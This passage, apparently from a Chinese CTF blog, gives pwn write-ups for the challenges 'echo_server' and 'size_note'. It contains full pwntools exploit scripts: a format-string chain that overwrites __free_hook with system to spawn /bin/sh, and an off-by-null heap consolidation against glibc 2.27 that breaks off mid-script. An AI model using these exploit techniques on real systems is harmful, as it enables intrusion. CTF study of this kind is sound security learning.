<span class="token comment"># add(11, p64(), )</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="echo-server"><a href="#echo-server" class="headerlink" title="echo_server"></a>echo_server</h2><p>在堆上的格式化字符串。先通过泄露栈上的数据获得 libc 基址（不管会不会做先泄露了先233）。因为栈上存在有指向栈的指针，通过格式化字符串写数据（指针）到栈上，再把那个指针作为跳板任意地址写。写这道题的时候我多做了好几步骤，高地址没必要写的 :(</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 常用的模板大概是</span>
<span class="token operator">%</span><span class="token punctuation">[</span>order<span class="token punctuation">]</span>$<span class="token punctuation">[</span><span class="token builtin">format</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token operator">%</span><span class="token punctuation">[</span>order<span class="token punctuation">]</span>$s
<span class="token punctuation">[</span>addr<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>pad<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">%</span><span class="token punctuation">[</span>order<span class="token punctuation">]</span>$n
<span class="token comment"># 这道题是在堆上的,所以用不到，但是这些带来一点灵感</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./echo'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ld-2.31.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># leak lbase</span>
ru<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b'100'</span><span class="token punctuation">)</span>

sl<span class="token punctuation">(</span><span class="token string">b'%13$p\n%6$p'</span><span class="token punctuation">)</span>
__libc_start_main243 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
rbp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
lbase <span class="token operator">=</span> __libc_start_main243 <span class="token operator">-</span> <span class="token number">243</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'rbp'</span><span class="token punctuation">,</span> rbp<span class="token punctuation">)</span>
__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
<span class="token comment"># __free_hook = lbase + libc.sym['__realloc_hook']</span>
mysystem <span class="token operator">=</span> lbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>

leak<span class="token punctuation">(</span><span class="token string">'mysystem'</span><span class="token punctuation">,</span> mysystem<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">,</span> __free_hook<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%10$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>__free_hook <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%6$hhn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%10$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__free_hook <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%6$hhn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x14</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%10$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__free_hook <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
<span class="token comment"># 栈上写入 __free_hook 的地址了</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%6$hhn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>rbp<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
<span class="token comment"># 恢复了栈指针的指向</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%12$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>mysystem <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%10$hhn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__free_hook <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%12$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mysystem <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%10$hhn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__free_hook <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">'%&#123;&#125;c%12$hn\x00'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token punctuation">(</span>mysystem <span class="token operator">>></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFFFF</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
<span class="token comment"># __free_hook 上已经写上了 system</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'100'</span><span class="token punctuation">)</span>
pay <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span>
sl<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>

sla<span class="token punctuation">(</span><span class="token string">b'your content\'s length:\n>> '</span><span class="token punctuation">,</span><span class="token string">b'0'</span><span class="token punctuation">)</span>
<span class="token comment"># 最后 free</span>

irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="size-note"><a href="#size-note" class="headerlink" title="size_note"></a>size_note</h2><p>libc-2.27.so，保护也全开了</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">pt_list<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> pt_list<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> sz_list<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>存在 off by null，看上去没有 UAF，但是经过操作之后就是基本的 UAF 了。分配三块 unsorted bin，大小得是 0x??8 以使用它的空间复用。通过覆盖使用 最后一块中表示前一块的 size，必须要刚好，在2.27 中存在校验，和 prev_inuse 就可以让对管理器进入合并流程。然后再分割 unsorted bin，把 main_arena96 推进到第二块为被释放的堆上。此时就存在了 UAF 了，接下来就是常用的手段。</p>
<p>具体可以见图。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220407125101942.png" alt="image-20220407125101942"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#! /usr/bin/python3</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span> gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">rs</span><span class="token punctuation">(</span>arg<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> p
    <span class="token keyword">if</span> arg <span class="token operator">==</span> <span class="token string">'remote'</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token operator">*</span>host<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        p <span class="token operator">=</span> binary<span class="token punctuation">.</span>process<span class="token punctuation">(</span>argv<span class="token operator">=</span>arg<span class="token punctuation">,</span> raw<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
host <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token number">6666</span><span class="token punctuation">)</span>
binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
ld   <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/home/rt/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so'</span><span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'size?\n>> '</span> <span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'content?\n>> '</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">b'index?\n>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'>> '</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>

rs<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 0x7f7d4047cca0 (main_arena+96)</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token string">b'tcache'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

